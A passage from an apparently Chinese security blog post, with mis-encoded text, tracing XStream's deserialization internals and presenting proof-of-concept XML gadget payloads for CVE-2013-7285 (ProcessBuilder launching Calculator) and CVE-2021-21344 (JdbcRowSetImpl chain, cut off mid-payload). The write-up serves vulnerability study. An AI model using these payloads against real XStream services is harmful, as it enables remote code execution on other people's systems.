class="name">com.ocean.Person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¾“å‡ºæ˜¯å°†javaå¯¹è±¡è½¬æ¢ä¸ºxmlæ ¼å¼ï¼Œå¹¶ä¸”ç±»æ˜¯æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹å®ç°äº†åºåˆ—åŒ–æ¥å£çš„ç±»è¾“å‡ºæ ¼å¼æ˜¯ä»€ä¹ˆæ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ocean.Person serialization=<span class="string">&quot;custom&quot;</span>&gt;</span><br><span class="line">  &lt;com.ocean.Person&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;age&gt;<span class="number">19</span>&lt;/age&gt;</span><br><span class="line">      &lt;company serialization=<span class="string">&quot;custom&quot;</span>&gt;</span><br><span class="line">        &lt;com.ocean.Company&gt;</span><br><span class="line">          &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">            &lt;companyLocation&gt;shandong&lt;/companyLocation&gt;</span><br><span class="line">            &lt;companyName&gt;zzzz&lt;/companyName&gt;</span><br><span class="line">          &lt;/<span class="keyword">default</span>&gt;</span><br><span class="line">        &lt;/com.ocean.Company&gt;</span><br><span class="line">      &lt;/company&gt;</span><br><span class="line">      &lt;name&gt;ocean&lt;/name&gt;</span><br><span class="line">    &lt;/<span class="keyword">default</span>&gt;</span><br><span class="line">  &lt;/com.ocean.Person&gt;</span><br><span class="line">&lt;/com.ocean.Person&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºå®ç°äº†åºåˆ—åŒ–æ¥å£å’Œä¸å®ç°åºåˆ—åŒ–æ¥å£åœ¨ç»è¿‡xstreamè½¬æ¢ä¹‹åçš„æ ¼å¼æ˜¯ä¸ä¸€æ ·çš„</p><h2 id="è°ƒè¯•æµç¨‹"><a href="#è°ƒè¯•æµç¨‹" class="headerlink" title="è°ƒè¯•æµç¨‹"></a>è°ƒè¯•æµç¨‹</h2><p>è¿™é‡Œæˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹xstreamåœ¨ååºåˆ—åŒ–æ—¶çš„æ‰§è¡Œæµç¨‹,Xstreamåœ¨ååºåˆ—åŒ–æ—¶è°ƒç”¨çš„æ–¹æ³•æ˜¯</p><p>fromXML</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Xstream_stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">19</span>, <span class="keyword">new</span> <span class="title class_">Company</span>(<span class="string">&quot;zzzz&quot;</span>, <span class="string">&quot;shandong&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        <span class="comment">//System.out.println(xml);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xStream.fromXML(xml);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‹æ–­ç‚¹å¼€å§‹è·Ÿä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735390997579-bb429176-92b2-4536-b3e5-c9a2a45fed45.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391021227-d52575bb-25ca-4558-b23f-6666e3abf367.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨unmarshalæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391085389-9ef088b5-dda3-4c4d-af66-8535ef15bd32.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391095200-86d3a170-a1f2-48ce-893a-d586a99c2fec.png"></p><p>è¿™é‡Œå‘ç°ä»–ä¼šè°ƒç”¨ReferenceByXPathMarshallingStrategyçˆ¶ç±»AbstractTreeMarshallingStrategyçš„unmarshalæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391280029-f0335716-8819-4426-b92a-50837a63fbf9.png"></p><p>å¾€ä¸‹èµ°è·Ÿè¿›TreeUnmarshallerç±»çš„startæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391343335-84748bd5-c7eb-4ee8-9954-a656afc321d6.png"></p><p>å…ˆçœ‹çœ‹readClassTypeåšäº†ä»€ä¹ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391409800-0497b88e-579f-46bb-a646-023918e16f24.png"></p><p>é€šè¿‡èŠ‚ç‚¹åè·å–Mapperä¸­å¯¹åº”çš„Classå¯¹è±¡è¿”å›å€¼typeå°±æ˜¯objå¯¹åº”çš„Classå¯¹è±¡ã€‚æ¥ç€åœ¨æ¥çœ‹çœ‹convertAnotheræ–¹æ³•å¹²å•¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391515365-17ddf802-6dc2-4232-9550-c2079e4bcbcd.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391553939-37bad94d-198a-4fa9-aa22-028427a6216b.png">æ ¹æ®mapperè·å–typeç±»å¯¹è±¡çš„æ­£ç¡®ç±»å‹æ ¹æ®typeæ‰¾åˆ°å¯¹åº”çš„converter ï¼Œå¦‚ä½•æŸ¥æ‰¾å¯¹åº”çš„converterï¼Ÿå¯ä»¥çœ‹åˆ°ä¸Šé¢å­˜åœ¨ä¸€ä¸ªlookupConverterForTypeçœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391697233-4408349a-c8a1-40be-a71f-6f92a0f856d9.png"></p><p>å…ˆä»ç¼“å­˜é›†åˆä¸­æŸ¥æ‰¾Converterï¼Œå¦‚æœç¼“å­˜ä¸­æ²¡æœ‰ï¼Œé‚£ä¹ˆå°±åœ¨converterä¸­å¯»æ‰¾ï¼Œç„¶åéå†convertersæ‰¾åˆ°ç¬¦åˆçš„Converterå¹¶æŠŠæ‰¾åˆ°çš„æ”¾åœ¨ç¼“å­˜é›†åˆä¸­ã€‚</p><p>ç»§ç»­èµ°ä¼šèµ°åˆ°convertæ–¹æ³•ä¸­<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392551241-c9cc4a24-7095-4d45-9fd6-47885590f9fa.png">ä¼šç»§ç»­è°ƒç”¨çˆ¶ç±»çš„covertæ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392571674-51120d17-24bc-4de7-b6ab-c8ca4ca51c40.png"></p><p>ä¼šè°ƒç”¨unmarshalæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392594331-39da6eb1-6f31-435f-9981-ef56b8f3bea3.png"></p><p>è¿™é‡Œæ„é€ Classç±»å¯¹è±¡çš„instanceå®ä¾‹ï¼Œfieldæ²¡æœ‰èµ‹å€¼ï¼Œéƒ½æ˜¯é»˜è®¤å€¼ï¼Œç„¶åå¯¹resultçš„fieldèµ‹å€¼ã€‚</p><h3 id="é‡ç‚¹"><a href="#é‡ç‚¹" class="headerlink" title="é‡ç‚¹"></a>é‡ç‚¹</h3><p>è¿™é‡Œä¼šæœ‰ä¸€ç‚¹ä¸ä¸€æ ·çš„æ˜¯å¯¹äºå®ç°åºåˆ—åŒ–æ¥å£çš„ç±»å’Œæ²¡æœ‰å®ç°çš„ç”¨åˆ°çš„convertæ˜¯ä¸ä¸€æ ·çš„è¿™é‡Œå¯ä»¥çœ‹åˆ°æ²¡å®ç°çš„convertæ˜¯ReflectionConverter<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392150239-746a70d9-26e6-4ad6-a051-a1232b781b8b.png"></p><p>å†æ¥çœ‹çœ‹å®ç°äº†çš„æ˜¯ä»€ä¹ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392198406-c6893ad4-99b9-4fa9-8a69-5198a3c84889.png"></p><p>å¯ä»¥çœ‹åˆ°ç”¨åˆ°çš„æ˜¯SerializableConverterè¯¥Converterçš„åŸç†æ˜¯é€šè¿‡åå°„è·å–ç±»å¯¹è±¡å¹¶é€šè¿‡åå°„ä¸ºå…¶æ¯ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼ï¼Œé‚£å¦‚è¿‡æ˜¯å¤„ç†å®ç°äº†Serializableæ¥å£å¹¶ä¸”é‡å†™äº†readObjectæ–¹æ³•çš„Peopleç±»æ—¶ä¼šæœ‰ä»€ä¹ˆä¸ä¸€æ ·å‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘ä»¬åœ¨Personç±»çš„readObjectæ–¹æ³•ä¸­æ‰“ä¸Šæ–­ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392319791-ba89493b-32f3-4d48-b422-2106461052c0.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä¼šè°ƒç”¨åˆ°Personç±»çš„ååºåˆ—åŒ–æ–¹æ³•çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">45</span>, Person (com.ocean)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">412</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">230</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1035</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1019</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">895</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">886</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">11</span>, Xstream_stu (com.ocean)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ­¤æ—¶å°±æ˜¯è¦å»æ‰¾é“¾å­äº†ã€‚</p><h2 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h2><h3 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h3><h4 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h4><p>jdk8u65</p><p>xstream 1.4.x-1.4.6åŠ1.4.10</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h3><h4 id="æµ‹è¯•ç¯å¢ƒ-1"><a href="#æµ‹è¯•ç¯å¢ƒ-1" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h4><p>jdk8u65</p><p>ç‰ˆæœ¬&lt;&#x3D;1.4.6æˆ–&#x3D;1.4.10</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¦ç»†æµç¨‹åˆ†æå‚è€ƒè‡ªï¼š<a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%88%86%E6%9E%90">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%88%86%E6%9E%90</a></p><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><h3 id="æµ‹è¯•ç¯å¢ƒ-2"><a href="#æµ‹è¯•ç¯å¢ƒ-2" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹Payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span 